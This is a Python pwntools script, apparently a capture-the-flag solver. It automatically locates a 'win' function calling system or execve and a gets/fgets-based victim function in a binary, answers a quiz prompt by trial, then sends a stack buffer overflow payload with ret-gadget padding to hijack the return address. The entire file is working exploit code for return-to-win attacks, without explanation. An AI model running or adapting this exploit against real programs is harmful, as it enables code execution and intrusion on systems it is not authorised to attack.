from pwn import *
e = ELF("code.bin")


io_local = e.process()

quizs = {}


def disasm_all(e: ELF):
    text_start = e.address+0x1000
    return e.disasm(text_start, e.bss()-text_start)


disasm_str = disasm_all(e).split('\n')


def xrefs(function_address):
    for line in disasm_str:
        if f"call   {hex(function_address)}".upper() in line.upper():
            _ = disasm_str.index(line)
            for i in range(_, 0, -1):
                if 'endbr64' in disasm_str[i]:
                    return int(disasm_str[i].split(":")[0], 16)


def find_offset(function_address):
    for line in disasm_str:
        if f"{hex(function_address)[2:]}:" in line:
            idx = disasm_str.index(line)
            for i in range(idx, len(disasm_str)):
                if "rax, [rbp-" in disasm_str[i]:
                    return int(disasm_str[i].split("-")[1].replace("]", ""), 16)
            break


try:
    win = xrefs(e.plt.system-4)
except:
    win = xrefs(e.plt.execve-4)

try:
    victim = xrefs(e.plt.gets-4)
except:
    victim = xrefs(e.plt.fgets-4)

offset = find_offset(victim)


def solve(quiz):
    if len(quiz) == 0:
        return "WTF"

    _ = quiz.split(' ')
    choices = [_[2*i+1] for i in range(len(_)//2)]

    for choice in choices:
        if choice not in quizs[quiz]:
            quizs[quiz].append(choice)
            return choice

    return quizs[quiz][1]


payload = b''
done = False
while True:
    quiz = io_local.recvline(
        timeout=1)

    if len(quiz) == 0:
        break

    elif b': No such file or directory\n' in quiz:
        done = True
        break

    quiz = quiz.decode().strip().replace("?", "")

    if quiz not in quizs:
        quizs[quiz] = ['']

    ans = solve(quiz).encode()
    io_local.sendline(ans)
    payload += ans+b' '

if not done:
    io_local.sendline(
        b'A'*offset +
        p64(0x000000000040101a)*(48//8+1) +
        p64(win)
    )
    exit_code = io_local.poll(True)

    payload += b'A'*offset +  p64(0x000000000040101a)*(48//8+1)
    if exit_code == -11:
        payload += p64(0x000000000040101a)
    payload += p64(win)
